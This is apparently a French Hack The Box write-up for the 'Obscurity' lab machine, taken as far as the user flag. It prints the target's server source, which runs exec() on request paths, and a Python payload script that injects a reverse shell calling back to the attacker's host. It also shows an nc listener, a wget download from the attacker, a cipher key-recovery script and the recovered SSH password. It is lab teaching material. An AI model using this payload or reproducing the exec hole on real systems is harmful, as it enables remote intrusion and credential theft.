---
layout: post
title: HTB - Obscurity
subtitle: Hack The Box - Linux Machine - Medium 
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [HTB, Linux, python, wfuzz, crypto]
comments: false
---

## 1. User

~~~
root@Host-001:~# nmap -sV -sT -A 10.10.10.168
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-20 04:43 CET
Nmap scan report for 10.10.10.168
Host is up (0.089s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 20 Mar 2020 03:46:08
|     Server: BadHTTPServer
|     Last-Modified: Fri, 20 Mar 2020 03:46:08
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|     <div class="sk-spinner sk-spinner-wordpress">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 20 Mar 2020 03:46:09
|     Server: BadHTTPServer
|     Last-Modified: Fri, 20 Mar 2020 03:46:09
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=3/20%Time=5E743BFD%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Fri,\x2020\x20Mar\x2020
SF:20\x2003:46:08\nServer:\x20BadHTTPServer\nLast-Modified:\x20Fri,\x2020\
SF:x20Mar\x202020\x2003:46:08\nContent-Length:\x204171\nContent-Type:\x20t
SF:ext/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\"
SF:en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>\
SF:n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t<
SF:meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-s
SF:cale=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20na
SF:me=\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Templ
SF:ate\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20st
SF:ylesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/boo
SF:tstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-a
SF:wesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templa
SF:temo-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-target
SF:=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n<
SF:div\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinner
SF:-wordpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20
SF:Fri,\x2020\x20Mar\x202020\x2003:46:09\nServer:\x20BadHTTPServer\nLast-M
SF:odified:\x20Fri,\x2020\x20Mar\x202020\x2003:46:09\nContent-Length:\x204
SF:171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20
SF:html>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t
SF:<title>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20co
SF:ntent=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20conte
SF:nt=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\nE
SF:asy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pro
SF:file\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"stylesh
SF:eet\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet
SF:\"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet
SF:\"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\"
SF:scroll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20
SF:section\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"s
SF:k-spinner\x20sk-spinner-wordpress\">\n");
Aggressive OS guesses: Linux 3.2 - 4.9 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.18 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.16 (91%), Crestron XPanel control system (91%), Adtran 424RG FTTH gateway (90%), Linux 2.6.32 (90%), Linux 2.6.39 - 3.2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   89.96 ms 10.10.14.1
2   90.03 ms 10.10.10.168

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.02 seconds
root@Host-001:~# 
~~~

Site web à l'url http://10.10.10.168:8080/

On trouve: 
~~~
'Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory'
~~~

On essaye avec dirb, sans résultat. On trouve un thread intéressant sur Reddit qui recommande d'utiliser wfuzz avec la synthaxe url/FUZZ/file.py. 

Ref de wfuzz: [https://wfuzz.readthedocs.io/en/latest/user/basicusage.html#fuzzing-paths-and-files](https://wfuzz.readthedocs.io/en/latest/user/basicusage.html#fuzzing-paths-and-files)

paramètre -c pour mettre de la couleur

~~~
root@Host-001:~# wfuzz -c -w /usr/share/wordlists/dirb/common.txt http://10.10.10.168:8080/FUZZ/SuperSecureServer.py

(...)
000001244:   404        6 L      14 W     174 Ch      "devel"        
000001245:   200        170 L    498 W    5892 Ch     "develop"      
000001243:   404        6 L      14 W     177 Ch      "dev60cgi" 
(...)

http://10.10.10.168:8080/develop/SuperSecureServer.py
~~~

Fichier python:


{% highlight javascript linenos %}
import socket
import threading
from datetime import datetime
import sys
import os
import mimetypes
import urllib.parse
import subprocess

respTemplate = """HTTP/1.1 {statusNum} {statusCode}
Date: {dateSent}
Server: {server}
Last-Modified: {modified}
Content-Length: {length}
Content-Type: {contentType}
Connection: {connectionType}

{body}
"""
DOC_ROOT = "DocRoot"

CODES = {"200": "OK", 
        "304": "NOT MODIFIED",
        "400": "BAD REQUEST", "401": "UNAUTHORIZED", "403": "FORBIDDEN", "404": "NOT FOUND", 
        "500": "INTERNAL SERVER ERROR"}

MIMES = {"txt": "text/plain", "css":"text/css", "html":"text/html", "png": "image/png", "jpg":"image/jpg", 
        "ttf":"application/octet-stream","otf":"application/octet-stream", "woff":"font/woff", "woff2": "font/woff2", 
        "js":"application/javascript","gz":"application/zip", "py":"text/plain", "map": "application/octet-stream"}


class Response:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)
        now = datetime.now()
        self.dateSent = self.modified = now.strftime("%a, %d %b %Y %H:%M:%S")
    def stringResponse(self):
        return respTemplate.format(**self.__dict__)

class Request:
    def __init__(self, request):
        self.good = True
        try:
            request = self.parseRequest(request)
            self.method = request["method"]
            self.doc = request["doc"]
            self.vers = request["vers"]
            self.header = request["header"]
            self.body = request["body"]
        except:
            self.good = False

    def parseRequest(self, request):        
        req = request.strip("\r").split("\n")
        method,doc,vers = req[0].split(" ")
        header = req[1:-3]
        body = req[-1]
        headerDict = {}
        for param in header:
            pos = param.find(": ")
            key, val = param[:pos], param[pos+2:]
            headerDict.update({key: val})
        return {"method": method, "doc": doc, "vers": vers, "header": headerDict, "body": body}


class Server:
    def __init__(self, host, port):    
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def listen(self):
        self.sock.listen(5)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            threading.Thread(target = self.listenToClient,args = (client,address)).start()

    def listenToClient(self, client, address):
        size = 1024
        while True:
            try:
                data = client.recv(size)
                if data:
                    # Set the response to echo back the recieved data 
                    req = Request(data.decode())
                    self.handleRequest(req, client, address)
                    client.shutdown()
                    client.close()
                else:
                    raise error('Client disconnected')
            except:
                client.close()
                return False
    
    def handleRequest(self, request, conn, address):
        if request.good:
#            try:
                # print(str(request.method) + " " + str(request.doc), end=' ')
                # print("from {0}".format(address[0]))
#            except Exception as e:
#                print(e)
            document = self.serveDoc(request.doc, DOC_ROOT)
            statusNum=document["status"]
        else:
            document = self.serveDoc("/errors/400.html", DOC_ROOT)
            statusNum="400"
        body = document["body"]
        
        statusCode=CODES[statusNum]
        dateSent = ""
        server = "BadHTTPServer"
        modified = ""
        length = len(body)
        contentType = document["mime"] # Try and identify MIME type from string
        connectionType = "Closed"


        resp = Response(
        statusNum=statusNum, statusCode=statusCode, 
        dateSent = dateSent, server = server, 
        modified = modified, length = length, 
        contentType = contentType, connectionType = connectionType, 
        body = body
        )

        data = resp.stringResponse()
        if not data:
            return -1
        conn.send(data.encode())
        return 0

    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])
            if os.path.isfile(requested):
                mime = mimetypes.guess_type(requested)
                mime = (mime if mime[0] != None else "text/html")
                mime = MIMES[requested.split(".")[-1]]
                try:
                    with open(requested, "r") as f:
                        data = f.read()
                except:
                    with open(requested, "rb") as f:
                        data = f.read()
                status = "200"
            else:
                errorPage = os.path.join(docRoot, "errors", "404.html")
                mime = "text/html"
                with open(errorPage, "r") as f:
                    data = f.read().format(path)
                status = "404"
        except Exception as e:
            print(e)
            errorPage = os.path.join(docRoot, "errors", "500.html")
            mime = "text/html"
            with open(errorPage, "r") as f:
                data = f.read()
            status = "500"
        return {"body": data, "mime": mime, "status": status}
{% endhighlight %}

Payload:

~~~
root@Host-001:~# cat payloadObscurity.py
import requests
import urllib
import os

url = 'http://10.10.10.168:8080/'

path='5\''+'\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.35",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])\na=\''

payload = urllib.parse.quote(path)
print("payload")
print(url+payload)

r= requests.get(url+payload)
print(r.headers)
print(r.text)
~~~

lancer nc dans une autre fenetre

~~~
root@Host-001:~# python3 payloadObscurity.py 
payload
http://10.10.10.168:8080/5%27%0Aimport%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.35%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22/bin/bash%22%2C%22-i%22%5D%29%0Aa%3D%27
~~~
~~~
root@Host-001:~# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.10.168] 43908
www-data@obscure:/$ cd /home
cd /home
www-data@obscure:/home$ ls
ls
robert
www-data@obscure:/home$ cd robert
cd robert
www-data@obscure:/home/robert$ ls -la
ls -la
total 60
drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 .
drwxr-xr-x 3 root   root   4096 Sep 24 22:09 ..
lrwxrwxrwx 1 robert robert    9 Sep 28 23:28 .bash_history -> /dev/null
-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH
drwx------ 2 robert robert 4096 Oct  3 16:02 .cache
-rw-rw-r-- 1 robert robert   94 Sep 26 23:08 check.txt
drwxr-x--- 3 robert robert 4096 Dec  2 09:53 .config
drwx------ 3 robert robert 4096 Oct  3 22:42 .gnupg
drwxrwxr-x 3 robert robert 4096 Oct  3 16:34 .local
-rw-rw-r-- 1 robert robert  185 Oct  4 15:01 out.txt
-rw-rw-r-- 1 robert robert   27 Oct  4 15:01 passwordreminder.txt
-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
-rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 SuperSecureCrypt.py
-rwx------ 1 robert robert   33 Sep 25 14:12 user.txt
www-data@obscure:/home/robert$ cat SuperSecureCrypt.py
cat SuperSecureCrypt.py
import sys
import argparse

def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted

parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')

parser.add_argument('-i',
                    metavar='InFile',
                    type=str,
                    help='The file to read',
                    required=False)

parser.add_argument('-o',
                    metavar='OutFile',
                    type=str,
                    help='Where to output the encrypted/decrypted file',
                    required=False)

parser.add_argument('-k',
                    metavar='Key',
                    type=str,
                    help='Key to use',
                    required=False)

parser.add_argument('-d', action='store_true', help='Decrypt mode')

args = parser.parse_args()

banner = "################################\n"
banner+= "#           BEGINNING          #\n"
banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
banner+= "################################\n"
banner += "  ############################\n"
banner += "  #        FILE MODE         #\n"
banner += "  ############################"
print(banner)
if args.o == None or args.k == None or args.i == None:
    print("Missing args")
else:
    if args.d:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Decrypting...")
        decrypted = decrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(decrypted)
    else:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Encrypting...")
        encrypted = encrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(encrypted)
www-data@obscure:/home/robert$ cat passwordreminder.txt
cat passwordreminder.txt
´ÑÈÌÉàÙÁÑé¯·¿kwww-data@obscure:/home/robert$ cat check.txt
cat check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct! 
www-data@obscure:/home/robert$ cat out.txt
cat out.txt
¦ÚÈêÚÞØÛÝÝ	×ÐÊß
ÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐ
êÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäè	ÎÍÚÎëÑÓäáÛÌ×	vwww-data@obscure:/home/robert$ 

www-data@obscure:/home/robert$ 
~~~

On a la fonction encrypt, le text en clair check.txt et le cipher out.txt

Créer un script pour trouver la clé de chiffrement

~~~
root@Host-001:~/Bureau# cat key.py
import string

with open('/home/robert/check.txt', 'r', encoding='utf-8') as f:
    mingwen = f.read()

key = ''

with open('/home/robert/out.txt', 'r', encoding='utf-8') as f:
    miwen = f.read()
    for c in range(len(mingwen)):
        for i in range(255):
            ch = chr((ord(miwen[c]) - i) % 255)
            if ch == mingwen[c]:
                key += chr(i)
                break
print(key)
root@Host-001:~/Bureau# chmod 777 key.py
root@Host-001:~/Bureau# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.168 - - [20/Mar/2020 08:14:35] "GET /key.py HTTP/1.1" 200 -
~~~

Récupérer le script sur le serveur et trouver la clé:

~~~
www-data@obscure:/tmp$ wget http://10.10.14.35/key.py
wget http://10.10.14.35/key.py
--2020-03-20 07:17:21--  http://10.10.14.35/key.py
Connecting to 10.10.14.35:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 405 [text/plain]
Saving to: ‘key.py’

     0K                                                       100% 53.1M=0s

2020-03-20 07:17:21 (53.1 MB/s) - ‘key.py’ saved [405/405]

www-data@obscure:/tmp$ python3 key.py
python3 key.py
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal
~~~

La clé est donc alexandrovich. Décrypter passwordreminder.txt

~~~
www-data@obscure:/tmp$ cd /home/robert                                      
cd /home/robert
www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/password.txt -k alexandrovich -d
txt -k alexandrovich -dt.py -i passwordreminder.txt -o /tmp/password.t
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to /tmp/password.txt...
www-data@obscure:/home/robert$ cat /tmp/password.txt
cat /tmp/password.txt
SecThruObsFTW
www-data@obscure:/home/robert$ 
~~~

On peut se connecter via SSH en utilisant le mdp qu'on vient de trouver:

~~~
root@Host-001:~# ssh robert@10.10.10.168
The authenticity of host '10.10.10.168 (10.10.10.168)' can't be established.
ECDSA key fingerprint is SHA256:H6t3x5IXxyijmFEZ2NVZbIZHWZJZ0d1IDDj3OnABJDw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.168' (ECDSA) to the list of known hosts.
robert@10.10.10.168's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar 20 07:35:03 UTC 2020

  System load:  0.0               Processes:             125
  Usage of /:   45.9% of 9.78GB   Users logged in:       1
  Memory usage: 11%               IP address for ens160: 10.10.10.168
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

40 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Mar 20 06:51:41 2020 from 10.10.15.244
robert@obscure:~$ cd /home/robert
robert@obscure:~$ cat user.txt
e4493782066b55fe2755708736ada2d7
robert@obscure:~$ 
~~~

**Poursuivez avec :** 

[- Oneliner Shells](https://0xss0rz.github.io/2020-05-10-Oneliner-shells/)

[- HTB - Write Up Machine](https://0xss0rz.github.io/2020-08-04-HTB-Write-Up/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
